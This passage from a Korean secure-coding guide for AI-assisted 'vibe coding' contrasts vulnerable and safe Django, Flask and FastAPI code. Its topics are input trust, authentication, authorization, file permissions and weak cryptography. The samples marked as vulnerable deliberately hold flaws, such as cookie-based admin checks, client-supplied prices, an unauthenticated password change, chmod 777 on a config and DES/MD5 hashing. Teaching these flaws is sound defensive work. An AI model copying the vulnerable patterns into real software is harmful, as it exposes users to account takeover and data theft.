        unit_price = int(request.POST.get('unit_price', '0'))
    except ValueError:
        return render(request, '/error.html', {'error': '올바른 숫자를 입력해주세요.'})

    # 입력값의 범위를 사전에 제한합니다
    if quantity < 0 or quantity > MAX_QUANTITY:
        return render(request, '/error.html', {'error': '수량 범위를 초과했습니다.'})

    if unit_price < 0 or unit_price > MAX_PRICE:
        return render(request, '/error.html', {'error': '가격 범위를 초과했습니다.'})

    # 안전한 범위 내에서 계산합니다
    total = quantity * unit_price  # 파이썬 기본 정수형 사용
    return render(request, '/price.html', {'total': total})
```

> **💡 팁:** 파이썬 기본 정수형(`int`)은 오버플로우가 발생하지 않으므로, 금액 계산 등 정확성이 중요한 연산은 `numpy` 대신 파이썬 기본 자료형을 사용하는 것이 안전합니다. `numpy`는 대량의 수치 데이터 처리에만 사용하고, 비즈니스 로직에서의 단일 값 계산에는 기본 자료형을 권장합니다.

### 바이브 코딩 시 체크포인트

- [ ] **`numpy`, `pandas` 등 C 기반 라이브러리에서 정수 연산을 수행할 때 입력값의 범위를 검증하고 있는가?**
- [ ] **금액, 수량 등 비즈니스 로직의 계산에 파이썬 기본 자료형을 사용하고 있는가?**
- [ ] **외부 입력값이 수치 연산에 사용될 때 최소/최대 범위가 설정되어 있는가?**

---

## 6-2. 보안기능 결정에 사용되는 부적절한 입력값

### 개요

보안기능 결정에 사용되는 부적절한 입력값(Reliance on Untrusted Inputs in a Security Decision)은 쿠키(Cookie), 히든 필드(Hidden Field), 환경변수 등 클라이언트 측에서 조작 가능한 값을 기반으로 인증이나 인가 같은 보안 결정을 내리는 취약점입니다.

바이브 코딩으로 회원 시스템, 관리자 페이지, 결제 기능 등을 구현할 때, AI가 생성한 코드에서 클라이언트 측 데이터를 신뢰하는 패턴이 자주 나타납니다. 여러분이 반드시 인지해야 할 중요한 원칙은 **클라이언트에서 오는 모든 데이터는 조작될 수 있다**는 것입니다.

### 왜 위험한가

> **💡 팁:** 인증과 인가의 올바른 구현 방법은 7장을 참고하십시오.

개발자들이 흔히 간과하는 사항이 있습니다:

- **쿠키**: 브라우저 개발자 도구(DevTools)나 프록시 도구(Burp Suite 등)로 언제든 수정 가능합니다
- **히든 필드**: HTML 소스를 보면 그대로 노출되며, 요청 시 값을 변경할 수 있습니다
- **URL 파라미터**: 주소창에서 직접 수정 가능합니다
- **HTTP 헤더**: 프록시 도구로 모든 헤더 값을 변조할 수 있습니다

다음과 같은 시나리오를 생각해보십시오:

```html
<!-- 쇼핑몰 결제 폼의 히든 필드 -->
<form action="/checkout" method="POST">
    <input type="hidden" name="price" value="50000" />
    <input type="hidden" name="user_role" value="customer" />
    <input type="submit" value="결제하기" />
</form>
```

공격자는 브라우저 개발자 도구로 `price` 값을 `1`로, `user_role`을 `admin`으로 변경한 후 폼을 전송할 수 있습니다.

### 취약한 코드

#### ❌ 취약한 코드: 쿠키로 관리자 여부 판단

```python
from django.shortcuts import render

def reset_password(request):
    # 쿠키에서 사용자 권한 등급을 가져옵니다
    # 쿠키는 클라이언트에서 언제든 조작할 수 있습니다!
    user_role = request.COOKIES.get('user_role', 'user')

    if user_role == 'admin':
        # 관리자 기능: 모든 사용자의 비밀번호를 초기화합니다
        target_user = request.POST.get('target_user', '')
        new_password = generate_temp_password()
        reset_user_password(target_user, new_password)
        send_reset_email(target_user, new_password)
        return render(request, '/admin/success.html')

    return render(request, '/error.html', {'error': '권한이 없습니다.'})
```

#### ❌ 취약한 코드: 히든 필드의 가격으로 결제 처리

```python
from django.shortcuts import render

def checkout(request):
    # 히든 필드에서 가격 정보를 받습니다
    # 클라이언트에서 가격을 1원으로 변조할 수 있습니다!
    price = int(request.POST.get('price', '0'))
    product_id = request.POST.get('product_id', '')

    # 클라이언트가 보낸 가격을 그대로 결제에 사용합니다
    process_payment(product_id, price)
    return render(request, '/checkout_success.html')
```

#### ❌ 취약한 코드: URL 파라미터로 사용자 식별

```python
from django.shortcuts import render

def view_profile(request):
    # URL에서 사용자 ID를 가져와 프로필을 표시합니다
    # /profile?user_id=123 → /profile?user_id=456으로 변경하면
    # 다른 사용자의 정보를 볼 수 있습니다
    user_id = request.GET.get('user_id')
    user_data = get_user_info(user_id)

    return render(request, '/profile.html', {'user': user_data})
```

> **⚠️ 주의:** AI 도구에 "관리자만 접근할 수 있는 페이지를 만들어줘"라고 요청하면, 쿠키나 히든 필드 기반의 간단한 권한 체크 코드가 생성될 수 있습니다. 이는 매우 취약한 구현입니다.

### 안전한 코드

#### ✅ 안전한 코드: 서버 세션(Session)으로 권한 관리

```python
from django.shortcuts import render
from django.contrib.auth.decorators import login_required, user_passes_test

def is_admin(user):
    """사용자가 관리자인지 서버 측 데이터로 확인합니다."""
    return user.is_staff or user.is_superuser

@login_required
@user_passes_test(is_admin)
def reset_password(request):
    # Django의 인증 시스템이 서버 세션을 기반으로
    # 사용자 인증과 권한을 검증합니다
    target_user = request.POST.get('target_user', '')
    new_password = generate_temp_password()
    reset_user_password(target_user, new_password)
    send_reset_email(target_user, new_password)
    return render(request, '/admin/success.html')
```

#### ✅ 안전한 코드: 서버에서 가격 조회 후 결제

```python
from django.shortcuts import render
from app.models import Product

def checkout(request):
    product_id = request.POST.get('product_id', '')

    # 가격을 클라이언트에서 받지 않고, 서버 데이터베이스에서 조회합니다
    try:
        product = Product.objects.get(id=product_id)
    except Product.DoesNotExist:
        return render(request, '/error.html', {'error': '상품을 찾을 수 없습니다.'})

    # 서버에 저장된 실제 가격으로 결제를 처리합니다
    process_payment(product.id, product.price)
    return render(request, '/checkout_success.html')
```

#### ✅ 안전한 코드: 인증된 사용자 정보로 프로필 접근

```python
from django.shortcuts import render
from django.contrib.auth.decorators import login_required

@login_required
def view_profile(request):
    # URL 파라미터가 아닌, 서버 세션의 인증된 사용자 정보를 사용합니다
    user_data = get_user_info(request.user.id)
    return render(request, '/profile.html', {'user': user_data})


@login_required
def view_other_profile(request, user_id):
    # 다른 사용자의 프로필을 보려면 권한 확인이 필요합니다
    if not request.user.is_staff and request.user.id != user_id:
        return render(request, '/error.html', {'error': '권한이 없습니다.'})

    user_data = get_user_info(user_id)
    return render(request, '/profile.html', {'user': user_data})
```

> **💡 팁:** 보안 결정에 사용되는 데이터(사용자 권한, 가격, 수량 등)는 반드시 **서버 측에서 관리하고 검증**해야 합니다. 클라이언트에서 전달되는 값은 참고용으로만 사용하고, 실제 로직 실행 전에 서버의 데이터베이스나 세션에서 확인하십시오.

### Django 인증 시스템 활용

Django 프레임워크는 안전한 인증과 권한 관리를 위한 기능을 기본으로 제공합니다:

```python
# settings.py - 세션 보안 설정
SESSION_COOKIE_HTTPONLY = True    # JavaScript에서 쿠키 접근 차단
SESSION_COOKIE_SECURE = True     # HTTPS에서만 쿠키 전송
SESSION_EXPIRE_AT_BROWSER_CLOSE = True  # 브라우저 종료 시 세션 만료
CSRF_COOKIE_HTTPONLY = True      # CSRF 토큰 쿠키도 보호

# DRF(Django REST Framework) 사용 시
REST_FRAMEWORK = {
    'DEFAULT_AUTHENTICATION_CLASSES': [
        'rest_framework.authentication.SessionAuthentication',
        'rest_framework.authentication.TokenAuthentication',
    ],
    'DEFAULT_PERMISSION_CLASSES': [
        'rest_framework.permissions.IsAuthenticated',
    ],
}
```

### 바이브 코딩 시 체크포인트

- [ ] **쿠키, 히든 필드, URL 파라미터 값을 보안 결정(인증, 인가, 결제)에 사용하고 있지 않은가?**
- [ ] **사용자 권한 확인은 서버 세션 또는 데이터베이스를 기반으로 수행하고 있는가?**
- [ ] **가격, 할인율 등 금전적 가치가 있는 데이터를 서버에서 조회하고 있는가?**
- [ ] **Django의 `@login_required`, `@user_passes_test`, `@permission_required` 등 내장 데코레이터를 활용하고 있는가?**
- [ ] **세션 쿠키에 `HttpOnly`, `Secure`, `SameSite` 속성이 설정되어 있는가?**
- [ ] **AI가 생성한 관리자 기능 코드에서 서버 측 권한 검증이 이루어지고 있는가?**

> **⚠️ 주의:** "클라이언트에서 보내는 데이터는 모두 거짓말일 수 있다"라는 원칙을 항상 기억하십시오. AI 도구에 관리자 기능을 요청할 때는 "Django 인증 시스템을 사용해서 서버 측에서 권한을 확인해줘"라고 명시하면 보다 안전한 코드가 생성됩니다.

---

## 6-3. 메모리 버퍼 오버플로우(Buffer Overflow)

### 개요

메모리 버퍼 오버플로우(Buffer Overflow)는 프로그램이 할당된 메모리 영역을 넘어서 데이터를 쓰는 취약점입니다. C/C++ 같은 저수준 언어에서 주로 발생합니다.

> **💡 팁:** Python은 자체적으로 메모리를 관리하므로 전통적인 버퍼 오버플로우가 발생하지 않습니다. 하지만 C 확장 모듈(예: numpy, PIL의 내부)이나 ctypes를 사용할 때는 주의가 필요합니다.

### 바이브 코딩 시 체크포인트

- [ ] C 확장 모듈을 직접 작성하지 않았는가?
- [ ] ctypes나 cffi로 외부 라이브러리를 호출할 때 입력 크기를 검증하는가?
- [ ] 사용하는 라이브러리(numpy, Pillow 등)를 최신 버전으로 유지하는가?

> **⚠️ 주의:** 바이브 코딩에서 이 취약점을 직접 마주칠 일은 거의 없지만, 의존 라이브러리의 보안 업데이트는 반드시 적용하십시오. `pip audit` 명령어로 취약한 패키지를 확인할 수 있습니다.

---

# PART 3. 보안 기능을 제대로 구현하세요

# Chapter 07. 인증과 인가, 그리고 권한 설정

## 7-1. 적절한 인증 없이 중요 기능 허용

### 인증 vs 인가 비교도

```
┌─────────────────────────────────────────────────────────────────────┐
│                    인증(Authentication) vs 인가(Authorization)                    │
├─────────────────────────────────┬───────────────────────────────────┤
│         ① 인증 (Authentication)         │         ② 인가 (Authorization)          │
├─────────────────────────────────┼───────────────────────────────────┤
│                                 │                                   │
│  핵심 질문:                     │  핵심 질문:                       │
│  "당신은 누구입니까?"           │  "무엇을 할 수 있습니까?"        │
│                                 │                                   │
│  ┌───────────────────────┐      │  ┌─────────────────────────┐      │
│  │  검증 수단            │      │  │  검증 수단              │      │
│  │  ・로그인 (ID/PW)     │      │  │  ・권한 (Permission)    │      │
│  │  ・비밀번호           │      │  │  ・역할 (Role)          │      │
│  │  ・생체인식 (지문 등) │      │  │  ・접근제어 (ACL)       │      │
│  └───────────┬───────────┘      │  └───────────┬─────────────┘      │
│              │                  │              │                    │
│              ▼                  │              ▼                    │
│  ┌───────────────────────┐      │  ┌─────────────────────────┐      │
│  │    결과: 신원 확인    │      │  │    결과: 행위 허가      │      │
│  └───────────────────────┘      │  └─────────────────────────┘      │
│                                 │                                   │
│  예시:                          │  예시:                            │
│  "김철수 본인이 맞습니다"       │  "관리자 페이지 접근 허용"       │
│                                 │                                   │
├─────────────────────────────────┴───────────────────────────────────┤
│                                                                     │
│              전체 흐름: 인증 → 인가 → 자원 접근                     │
│                                                                     │
│  ┌────────┐      ┌────────────┐      ┌────────────┐      ┌───────┐ │
│  │ 사용자 │──▶│   ① 인증   │══▶│   ② 인가   │──▶│ 자원  │ │
│  │        │      │ (신원확인) │      │ (권한확인) │      │ 접근  │ │
│  └────────┘      └──────┬─────┘      └──────┬─────┘      └───────┘ │
│                         │                   │                       │
│                    실패 시               실패 시                    │
│                         │                   │                       │
│                         ▼                   ▼                       │
│                  ┌────────────┐      ┌────────────┐                 │
│                  │ 401        │      │ 403        │                 │
│                  │ Unauthorized│      │ Forbidden  │                 │
│                  │ (인증 실패)│      │ (인가 실패)│                 │
│                  └────────────┘      └────────────┘                 │
│                                                                     │
│  ⚠️  바이브 코더 주의:                                              │
│  인증만 하고 인가를 빠뜨리면 → 모든 로그인 사용자가 관리자 기능    │
│  사용 가능! 반드시 둘 다 구현할 것                                  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 개요

인증(Authentication)이란 "당신이 누구인지 확인하는 과정"입니다. 여러분이 웹사이트에 로그인할 때 아이디와 패스워드를 입력하는 것이 가장 대표적인 인증 절차입니다. 문제는 AI 도구로 웹사이트를 빠르게 만들다 보면, 중요한 기능에 인증 절차를 빠뜨리는 경우가 빈번하게 발생한다는 것입니다.

예를 들어 "패스워드 변경 페이지를 만들어줘"라고 AI에게 요청하면, AI는 패스워드를 변경하는 로직은 잘 만들어주지만 **현재 로그인한 사용자인지 확인하는 과정**을 생략하는 경우가 많습니다. 이렇게 인증 없이 중요 기능이 노출되면, 공격자는 URL만 알면 누구의 패스워드든 변경할 수 있게 됩니다.

### 왜 위험한가

인증이 누락된 기능은 공격자에게 열린 문과 같습니다. 구체적으로 다음과 같은 위험이 존재합니다.

- **계정 탈취**: 패스워드 변경, 이메일 변경 등의 기능에 인증이 없으면 타인의 계정을 손쉽게 장악할 수 있습니다.
- **데이터 유출**: 관리자 전용 API에 인증이 없으면 전체 사용자 목록, 결제 정보 등이 노출될 수 있습니다.
- **권한 상승(Privilege Escalation)**: 일반 사용자가 관리자 기능에 접근하여 시스템 전체를 제어할 수 있습니다.

> **⚠️ 주의:** AI가 생성한 코드에서 `@login_required`나 인증 미들웨어(Middleware)가 빠져 있는지 반드시 확인하십시오. AI는 "동작하는 코드"를 우선시하기 때문에 보안 데코레이터를 생략하는 경향이 있습니다.

### 취약한 코드

다음은 패스워드 변경 시 현재 사용자의 인증을 수행하지 않는 ❌ 취약한 코드입니다.

```python
# ❌ 취약한 코드: 인증 없이 패스워드 변경 허용
from django.shortcuts import render
import hashlib

def change_password(request):
    new_pwd = request.POST.get('new_password', '')
    user = request.POST.get('user_id', '')
    # 현재 패스워드 확인 없이 바로 변경
    sha = hashlib.sha256(new_pwd.encode())
    update_password_in_db(user, sha.hexdigest())
    return render(request, 'success.html')
```

이 코드는 두 가지 심각한 문제를 가지고 있습니다. 첫째, 로그인 여부를 확인하지 않으므로 비로그인 상태에서도 접근 가능합니다. 둘째, 현재 패스워드와의 일치 여부를 확인하지 않으므로 URL만 알면 누구든 패스워드를 변경할 수 있습니다.

### 안전한 코드

다음은 Django의 `login_required` 데코레이터와 현재 패스워드 확인을 적용한 ✅ 안전한 코드입니다.

```python
# ✅ 안전한 코드: 인증 절차를 포함한 패스워드 변경
from django.contrib.auth.decorators import login_required
from django.shortcuts import render
import hashlib

@login_required
def change_password(request):
    new_pwd = request.POST.get('new_password', '')
    confirm_pwd = request.POST.get('confirm_password', '')
    current_pwd = request.POST.get('current_password', '')

    # 세션에서 로그인된 사용자 정보 가져오기
    user = request.user

    # 현재 패스워드 일치 여부 확인 (재인증)
    if not user.check_password(current_pwd):
        return render(request, 'error.html', {'error': '현재 패스워드가 일치하지 않습니다.'})

    # 새 패스워드와 확인 패스워드 일치 확인
    if new_pwd != confirm_pwd:
        return render(request, 'error.html', {'error': '새 패스워드가 일치하지 않습니다.'})

    user.set_password(new_pwd)
    user.save()
    return render(request, 'success.html')
```

Flask를 사용하는 경우에는 Flask-Login 라이브러리의 `@login_required` 데코레이터를 사용합니다.

```python
# ✅ Flask에서의 안전한 코드
from flask_login import login_required, current_user

@app.route('/change-password', methods=['POST'])
@login_required
def change_password():
    current_pwd = request.form.get('current_password')
    if not current_user.check_password(current_pwd):
        return '현재 패스워드가 일치하지 않습니다.', 403
    # ... 패스워드 변경 로직
```

### 바이브 코딩 시 체크포인트

- [ ] AI가 생성한 모든 뷰(View) 함수에 `@login_required` 또는 인증 미들웨어가 적용되어 있는지 확인합니다.
- [ ] 패스워드 변경, 결제, 개인정보 수정 등 중요 기능에는 **재인증(Re-authentication)** 로직이 포함되어 있는지 확인합니다.
- [ ] AI에게 코드를 요청할 때 "로그인한 사용자만 접근 가능하도록"이라는 조건을 명시적으로 포함합니다.
- [ ] API 엔드포인트(Endpoint)의 경우 토큰 기반 인증(Token-based Authentication)이 적용되어 있는지 확인합니다.

> **💡 팁:** AI에게 코드를 요청할 때 "인증이 필요한 엔드포인트입니다"라고 명시하면 인증 관련 코드를 포함할 확률이 크게 높아집니다. 예: "로그인한 사용자만 접근 가능한 패스워드 변경 API를 만들어줘. 현재 패스워드 확인도 포함해줘."

---

## 7-2. 부적절한 인가

### 개요

인가(Authorization)란 "인증된 사용자가 특정 자원이나 기능에 접근할 권한이 있는지 확인하는 과정"입니다. 인증이 "누구인지 확인"이라면, 인가는 "무엇을 할 수 있는지 확인"하는 것입니다.

바이브 코딩에서 흔히 발생하는 실수는 로그인 확인만 하고 **역할(Role) 기반의 권한 확인을 생략**하는 것입니다. 예를 들어 일반 사용자가 관리자 전용 삭제 기능에 접근할 수 있다면 이는 인가가 부적절한 것입니다.

### 왜 위험한가

부적절한 인가는 다음과 같은 심각한 보안 사고로 이어질 수 있습니다.

- **수평적 권한 상승(Horizontal Privilege Escalation)**: 같은 역할의 다른 사용자 데이터에 접근할 수 있습니다. 예를 들어 A 사용자가 B 사용자의 주문 내역을 조회하는 경우입니다.
- **수직적 권한 상승(Vertical Privilege Escalation)**: 일반 사용자가 관리자 기능을 실행할 수 있습니다. 예를 들어 일반 사용자가 전체 게시글을 삭제하는 경우입니다.
- **데이터 변조**: 권한 없는 사용자가 중요 데이터를 수정하거나 삭제할 수 있습니다.

### 취약한 코드

다음은 사용자의 권한 확인 없이 삭제 기능을 수행하는 ❌ 취약한 코드입니다.

```python
# ❌ 취약한 코드: 권한 확인 없이 콘텐츠 삭제
from django.shortcuts import render
from .models import Content

def delete_content(request):
    action = request.POST.get('action', '')
    content_id = request.POST.get('content_id', '')
    # 사용자의 권한 확인 없이 바로 삭제 수행
    if action == "delete":
        Content.objects.filter(id=content_id).delete()
        return render(request, 'success.html')
    return render(request, 'error.html')
```

### 안전한 코드

Django의 `permission_required` 데코레이터를 사용하여 역할 기반 접근 제어(RBAC, Role-Based Access Control)를 적용한 ✅ 안전한 코드입니다.

```python
# ✅ 안전한 코드: 역할 기반 권한 확인 후 삭제
from django.contrib.auth.decorators import login_required, permission_required
from django.shortcuts import render
from .models import Content

@login_required
@permission_required('app.delete_content', raise_exception=True)
def delete_content(request):
    action = request.POST.get('action', '')
    content_id = request.POST.get('content_id', '')

    if action == "delete":
        # 해당 콘텐츠가 현재 사용자의 것인지도 확인
        content = Content.objects.filter(id=content_id, author=request.user).first()
        if content is None:
            return render(request, 'error.html', {'error': '삭제 권한이 없습니다.'})
        content.delete()
        return render(request, 'success.html')
    return render(request, 'error.html')
```

FastAPI에서는 의존성 주입(Dependency Injection)을 활용한 권한 확인이 가능합니다.

```python
# ✅ FastAPI에서의 역할 기반 인가
from fastapi import Depends, HTTPException, status

def require_role(required_role: str):
    def role_checker(current_user: User = Depends(get_current_user)):
        if current_user.role != required_role:
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="권한이 없습니다."
            )
        return current_user
    return role_checker

@app.delete("/content/{content_id}")
async def delete_content(
    content_id: int,
    user: User = Depends(require_role("admin"))
):
    # 관리자만 접근 가능
    await Content.filter(id=content_id).delete()
    return {"message": "삭제 완료"}
```

### 바이브 코딩 시 체크포인트

- [ ] 모든 API 엔드포인트에 "누가 이 기능을 사용할 수 있는가?"를 정의했는지 확인합니다.
- [ ] 데이터 조회/수정/삭제 시 **소유권 확인**(현재 사용자의 데이터인지)을 수행하는지 확인합니다.
- [ ] AI에게 "관리자만 접근 가능" 또는 "본인 데이터만 접근 가능"이라는 조건을 명시합니다.
- [ ] URL에 포함된 ID 값을 변경하여 다른 사용자의 데이터에 접근할 수 없는지 테스트합니다.

> **💡 팁:** AI에게 코드를 요청할 때 "이 API는 admin 역할을 가진 사용자만 접근 가능합니다. 일반 사용자는 본인의 데이터만 조회/수정 가능합니다."와 같이 역할별 접근 조건을 명확히 전달하십시오.

---

## 7-3. 중요한 자원에 대한 잘못된 권한 설정

### 개요

파일 권한(File Permission)이란 운영체제에서 파일이나 디렉터리에 대해 "누가 읽고, 쓰고, 실행할 수 있는지"를 제어하는 설정입니다. 파이썬에서는 `os.chmod()`, `os.fchmod()` 등의 함수를 통해 파일의 권한을 설정할 수 있습니다.

바이브 코딩으로 서버 배포 스크립트를 작성할 때, AI는 종종 파일 권한을 `0o777`(모든 사용자에게 모든 권한 허용)로 설정하는 코드를 생성합니다. 이는 편의성을 위한 것이지만, 보안 관점에서는 매우 위험한 설정입니다.

### 왜 위험한가

잘못된 파일 권한 설정은 다음과 같은 위험을 초래합니다.

- **설정 파일 노출**: 데이터베이스 접속 정보, API 키 등이 포함된 설정 파일을 누구나 읽을 수 있게 됩니다.
- **파일 변조**: 실행 파일이나 라이브러리를 악의적으로 수정할 수 있습니다.
- **악성 코드 실행**: 쓰기 권한이 열린 디렉터리에 악성 스크립트를 업로드하고 실행할 수 있습니다.

### 취약한 코드

다음은 설정 파일에 모든 사용자의 접근을 허용하는 ❌ 취약한 코드입니다.

```python
# ❌ 취약한 코드: 모든 사용자에게 읽기/쓰기/실행 권한 부여
import os

def write_config():
    # 0o777 = 모든 사용자가 읽기, 쓰기, 실행 가능
    os.chmod('/app/config/settings.json', 0o777)
    with open('/app/config/settings.json', 'w') as f:
        f.write('{"db_host": "localhost", "db_password": "secret123"}')
```

### 안전한 코드

파일 소유자에게만 필요한 최소 권한을 부여하는 ✅ 안전한 코드입니다.

```python
# ✅ 안전한 코드: 소유자에게만 읽기/쓰기 권한 부여
import os
import stat

def write_config():
    config_path = '/app/config/settings.json'
    with open(config_path, 'w') as f:
        f.write('{"db_host": "localhost"}')
    # 소유자만 읽기/쓰기 가능 (0o600)
    os.chmod(config_path, stat.S_IRUSR | stat.S_IWUSR)

def write_executable():
    script_path = '/app/scripts/deploy.sh'
    with open(script_path, 'w') as f:
        f.write('#!/bin/bash\necho "deploying..."')
    # 소유자만 읽기/실행 가능 (0o500)
    os.chmod(script_path, stat.S_IRUSR | stat.S_IXUSR)
```

> **💡 팁:** 리눅스(Linux) 파일 권한을 외우기 어려우시다면, 최소한 이것만 기억하십시오. `0o600`은 소유자만 읽기/쓰기, `0o700`은 소유자만 읽기/쓰기/실행, `0o644`는 소유자 읽기/쓰기 + 나머지 읽기만, `0o777`은 **절대 사용 금지**입니다.

### 바이브 코딩 시 체크포인트

- [ ] AI가 생성한 코드에서 `os.chmod`나 `os.makedirs`를 사용하는 부분의 권한 값을 확인합니다.
- [ ] `0o777` 또는 `0o666`이 사용된 곳이 있다면 즉시 최소 권한으로 변경합니다.
- [ ] 설정 파일(`.env`, `config.json` 등)의 권한이 소유자 전용(`0o600`)으로 설정되어 있는지 확인합니다.
- [ ] 배포 스크립트에서 파일 권한을 설정하는 부분이 있다면 최소 권한 원칙(Principle of Least Privilege)을 따르는지 검토합니다.
- [ ] Docker 환경에서 파일을 복사할 때 `--chown` 옵션을 사용하여 적절한 소유자와 권한을 설정합니다.

> **⚠️ 주의:** AI에게 "파일 권한 오류를 해결해줘"라고 요청하면, AI는 가장 쉬운 해결책인 `chmod 777`을 제안하는 경우가 많습니다. 이는 권한 문제를 해결하는 것이 아니라, 보안을 완전히 포기하는 것입니다. 반드시 필요한 최소 권한만 부여하십시오.


---

# Chapter 08. 암호화, 제대로 하고 계십니까

## 8-1. 취약한 암호화 알고리즘 사용

### 암호화 알고리즘 안전/위험 분류표

```
┌─────────────────────────────────────────────────────────────────────┐
│               암호화 알고리즘 안전/위험 분류표                      │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ❌ 위험 (사용 금지) ══════════════════════════════════════════     │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │  알고리즘       │  유형          │  위험 사유               │    │
│  ├─────────────────┼────────────────┼──────────────────────────┤    │
│  │  DES            │  대칭 암호     │  56비트 키, 무차별 크랙  │    │
│  │  3DES           │  대칭 암호     │  느리고 취약, 폐기 예정  │    │
│  │  RC4            │  스트림 암호   │  편향 바이트, TLS 금지   │    │
│  │  MD5            │  해시          │  충돌 공격 가능          │    │
│  │  SHA-1          │  해시          │  충돌 공격 실증됨        │    │
│  └─────────────────────────────────────────────────────────────┘    │
│       ══▶ 이 알고리즘이 코드에 있으면 즉시 교체 필요!              │
│                                                                     │
│  ⚠️  주의 (조건부 사용) ──────────────────────────────────────     │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │  알고리즘       │  유형          │  주의 사항               │    │
│  ├─────────────────┼────────────────┼──────────────────────────┤    │
│  │  SHA-256        │  해시          │  단독 패스워드 해싱에    │    │
│  │  (단독 사용)    │                │  부적절 (솔트/반복 없음) │    │
│  │                 │                │  HMAC 조합 시 안전       │    │
│  └─────────────────────────────────────────────────────────────┘    │
│       ─ ─▶ 용도에 따라 적절한 대안 선택                            │
│                                                                     │
│  ✅ 안전 (권장) ──────────────────────────────────────────────     │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │  알고리즘       │  유형          │  권장 용도               │    │
│  ├─────────────────┼────────────────┼──────────────────────────┤    │
│  │  AES-256        │  대칭 암호     │  데이터 암호화           │    │
│  │  ChaCha20       │  스트림 암호   │  모바일/경량 암호화      │    │
│  │  RSA-2048+      │  비대칭 암호   │  키 교환, 전자서명       │    │
│  │  SHA-256 (HMAC) │  메시지 인증   │  무결성 검증             │    │
│  │  bcrypt         │  패스워드 해시 │  패스워드 저장           │    │
│  │  argon2         │  패스워드 해시 │  패스워드 저장 (최신)    │    │
│  └─────────────────────────────────────────────────────────────┘    │
│       ──▶ AI가 생성한 코드에서 이 알고리즘을 사용하는지 확인!      │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │  💡 바이브 코더 빠른 판별법:                                │    │
│  │                                                             │    │
│  │  import hashlib                                             │    │
│  │  hashlib.md5(...)      ══▶  ❌ 즉시 교체                   │    │
│  │  hashlib.sha1(...)     ══▶  ❌ 즉시 교체                   │    │
│  │  bcrypt.hashpw(...)    ──▶  ✅ 안전                        │    │
│  └─────────────────────────────────────────────────────────────┘    │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 개요

암호화 알고리즘(Encryption Algorithm)은 중요한 정보를 보호하기 위한 핵심 수단입니다. 그러나 과거에 안전하다고 여겨졌던 알고리즘 중 상당수가 컴퓨터 성능의 향상과 함께 취약해졌습니다. MD5, SHA-1, DES, RC4와 같은 알고리즘이 대표적입니다.

바이브 코딩에서 특히 주의해야 할 점은, AI가 학습한 데이터에 오래된 코드 예제가 다수 포함되어 있다는 것입니다. 따라서 AI는 여전히 MD5나 SHA-1을 사용하는 코드를 생성할 수 있습니다. 여러분이 직접 알고리즘의 안전성을 판단할 수 있어야 합니다.

### 왜 위험한가

취약한 암호화 알고리즘을 사용하면 다음과 같은 위험이 발생합니다.

- **해시 충돌(Hash Collision)**: MD5와 SHA-1은 서로 다른 입력에서 같은 해시값이 생성되는 충돌이 실제로 발견되었습니다. 이를 통해 위조된 인증서나 문서를 만들 수 있습니다.
- **브루트포스 공격(Brute-Force Attack)**: DES는 56비트 키를 사용하므로, 현대 컴퓨터로 수 시간 내에 모든 키를 시도할 수 있습니다.
- **레인보우 테이블(Rainbow Table) 공격**: MD5 해시값은 이미 방대한 레인보우 테이블이 존재하여, 해시값만으로 원문을 역추적할 수 있습니다.

### 취약한 코드

다음은 취약한 DES 알고리즘과 MD5 해시를 사용하는 ❌ 취약한 코드입니다.

```python
# ❌ 취약한 코드: DES 암호화 사용
from Crypto.Cipher import DES
import base64

def encrypt_data(plain_text, key):
    # DES는 56비트 키로 현대 컴퓨터에서 쉽게 해독 가능
    cipher = DES.new(key, DES.MODE_ECB)
    encrypted = base64.b64encode(cipher.encrypt(plain_text.ljust(8)))
    return encrypted.decode('ASCII')
```

```python
# ❌ 취약한 코드: MD5 해시 사용
import hashlib

def hash_password(password):
    # MD5는 충돌이 발견되어 더 이상 안전하지 않음
    return hashlib.md5(password.encode('utf-8')).hexdigest()
```

### 안전한 코드

AES-256과 SHA-256을 사용하는 ✅ 안전한 코드입니다.

```python
# ✅ 안전한 코드: AES-256 CBC 모드 암호화
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import base64

def encrypt_data(plain_text, key):
    # AES-256 CBC 모드 사용 (키 길이 32바이트 = 256비트)
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(plain_text.encode('utf-8'), AES.block_size))
    # IV를 암호문 앞에 결합하여 저장
    return base64.b64encode(iv + encrypted).decode('ASCII')

def decrypt_data(encrypted_text, key):
    raw = base64.b64decode(encrypted_text)
    iv = raw[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size)
    return decrypted.decode('utf-8')
```

```python
# ✅ 안전한 코드: SHA-256 해시 사용
import hashlib

def hash_data(data):
    # SHA-256은 현재 안전한 해시 알고리즘
    return hashlib.sha256(data.encode('utf-8')).hexdigest()
```

> **⚠️ 주의:** ECB(Electronic Code Block) 모드는 같은 평문 블록이 항상 같은 암호문을 생성하므로 패턴이 노출됩니다. 반드시 CBC, CTR, GCM 등의 운영 모드를 사용하십시오.

### 바이브 코딩 시 체크포인트

- [ ] AI가 생성한 코드에서 `DES`, `MD5`, `SHA1`, `RC4`, `Blowfish`를 사용하는 부분이 없는지 검색합니다.
- [ ] 대칭키 암호화는 AES-128 이상(권장 AES-256)을 사용합니다.
- [ ] 해시 함수는 SHA-256 이상을 사용합니다.
- [ ] ECB 모드 대신 CBC, GCM 등의 안전한 운영 모드를 사용하는지 확인합니다.
- [ ] AI에게 "안전한 암호화 알고리즘을 사용해줘"라고 명시합니다.

---

## 8-2. 암호화되지 않은 중요정보

### 개요

많은 웹 애플리케이션은 패스워드, 주민등록번호, 신용카드 번호 등의 중요정보(Sensitive Information)를 다루게 됩니다. 이러한 정보가 평문(Plaintext)으로 저장되거나 전송되면, 데이터베이스 유출이나 네트워크 도청 시 모든 정보가 그대로 노출됩니다.

